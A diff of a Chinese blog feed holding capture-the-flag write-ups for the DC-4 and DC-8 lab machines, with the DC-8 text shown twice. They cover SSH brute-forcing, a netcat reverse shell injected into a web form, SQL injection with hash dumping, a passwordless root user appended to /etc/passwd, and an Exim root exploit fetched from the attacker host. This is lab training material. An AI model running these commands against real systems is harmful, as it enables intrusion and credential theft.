+<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
+<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
+</blockquote>
+<p>得到 <code>jim  jibril04</code></p>
+<p>连接ssh</p>
+<blockquote>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#x69;&#x6d;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#53;">&#106;&#x69;&#x6d;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#53;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#x69;&#109;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#106;&#x69;&#109;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
+<p><strong>jim@dc-4:~$ pwd</strong></p>
+<p>/home/jim</p>
+<p>##看看有什么可以使用的root权限命令</p>
+<p><strong>jim@dc-4:~$ sudo -l</strong></p>
+<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>
+
+<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
+<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw——- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
+<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
+<p>This is a test.</p>
+</blockquote>
+<p>可以看到jim发了一条电子邮件</p>
+<p>去看一下./var/mail</p>
+<blockquote>
+<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
+<p>Hi Jim,</p>
+<p>I’m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
+<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
+<p>See ya,<br>Charles</p>
+<p>**jim@dc-4:/var/mail$ **</p>
+</blockquote>
+<p>发现了Charles的密码<code>^xHhA&amp;hvim0y</code></p>
+<p>su看看能否切换到charles</p>
+<blockquote>
+<p><strong>jim@dc-4:~$ su charles</strong></p>
+<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
+</blockquote>
+<p>看看Charles有什么可以使用的root命令</p>
+<blockquote>
+<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
+</blockquote>
+<p>发现可以不使用密码就能执行<code>teehee</code></p>
+<p>搜了一下 可以利用<code>teehee</code>进行提权</p>
+<blockquote>
+<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
+</blockquote>
+<p><img src="/posts/d8125b4/teeheeuser.png"></p>
+<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
+<p>七个字段</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>Mamor:x:0:0:::/bin/bash</p>
+<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
+<blockquote>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#111;&#x72;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;">&#77;&#97;&#109;&#111;&#x72;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#x6d;&#111;&#114;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#x33;&#53;">&#77;&#x61;&#x6d;&#111;&#114;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#x61;&#109;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#77;&#x61;&#109;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password: </p>
+<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
+</blockquote>
+<p>构造失败，重新构造一个</p>
+<blockquote>
+<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
+<p>………….</p>
+<p>Mamor111::0:0:::/bin/bash</p>
+<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
+<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
+<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
+<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  “Y88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88””88b 888 “88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      “   “   “   “<br>888P     Y888  “Y8888  888 888      8888888P”   “Y88P”  888  888  “Y8888  888 888 888 888 </p>
+<p>Congratulations!!!</p>
+<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
+<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
+</blockquote>
+<br>
+<br>
+
+<p>总结</p>
+<ul>
+<li>nmap扫网段，靶机端口</li>
+<li>dirsearch扫目录</li>
+<li>burpsuite爆破后台</li>
+<li>进入后台发现能执行部分命令并抓包修改发现能命令执行</li>
+<li>反弹shell<blockquote>
+<p>反弹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burp改包<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>使用python得到交互式shell<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+</li>
+<li>cat /etc/passwd 发现三个用户，并查看信息</li>
+<li>ssh用户爆破</li>
+<li><strong>teehee提权</strong><blockquote>
+<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
+</blockquote>
+</li>
+<li>创建管理员身份并切换</li>
+<li>得到flag</li>
+</ul>
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<p>Reference</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
+<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
+<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
+</blockquote>
 ]]></content>
       <categories>
         <category>DCchallenges</category>
@@ -1280,6 +1280,106 @@ $R=$Z('',$X);$R();
       </tags>
   </entry>
   <entry>
+    <title>DCchallenges8</title>
+    <url>/posts/437699f/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段     192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.141</p>
+</blockquote>
+<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
+</blockquote>
+<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
+</blockquote>
+<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<p>sudo python3 dirsearch -u 192.168.18.141</p>
+</blockquote>
+<p>没扫到什么东西，换dirb扫到了</p>
+<p><code>http://192.168.18.141/user</code></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
+<p>sqlmap跑一下</p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
+<blockquote>
+<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
+<blockquote>
+<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
+<blockquote>
+<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
+</blockquote>
+<br>
+
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
+<blockquote>
+<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
+</blockquote>
+<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
+<br>
+
+<p><code>admin</code> 使用john没跑出来</p>
+<p><code>john</code> 密码为<code>turtle</code></p>
+<p><code>http://192.168.18.141/user/</code>登录成功</p>
+<p>打开content看看</p>
+<p><img src="/posts/437699f/content.png"></p>
+<br>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
+<p>修改成php格式</p>
+<p><img src="/posts/437699f/ncshell.png"></p>
+<p><img src="/posts/437699f/submit.png"></p>
+<p>反弹交互shell</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="/posts/437699f/python_shell.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
+<p><img src="/posts/437699f/find.png"></p>
+<p>试着利用下exim4</p>
+<p>查看exim4版本</p>
+<p><code>exim4 --version</code></p>
+<blockquote>
+<p>Exim version 4.89 </p>
+</blockquote>
+<p><code>searchsploit  exim 4</code></p>
+<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
+<blockquote>
+<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
+<p>python2 -m SimpleHTTPServer</p>
+</blockquote>
+<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
+<blockquote>
+<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
+</blockquote>
+<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
+<blockquote>
+<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
+</blockquote>
+<p>看下提示用法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/437699f/flag.png"></p>
+<br>
+
+<br>
+
+<blockquote>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
+<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DCchallenges9</title>
     <url>/posts/73305909/</url>
     <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
@@ -1413,106 +1513,6 @@ $R=$Z('',$X);$R();
       </tags>
   </entry>
   <entry>
-    <title>DCchallenges8</title>
-    <url>/posts/437699f/</url>
-    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段     192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.141</p>
-</blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
-</blockquote>
-<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
-</blockquote>
-<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
-<p>sudo python3 dirsearch -u 192.168.18.141</p>
-</blockquote>
-<p>没扫到什么东西，换dirb扫到了</p>
-<p><code>http://192.168.18.141/user</code></p>
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
-<p>sqlmap跑一下</p>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
-<blockquote>
-<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
-</blockquote>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
-<blockquote>
-<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
-</blockquote>
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
-<blockquote>
-<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
-</blockquote>
-<br>
-
-<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
-<blockquote>
-<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
-</blockquote>
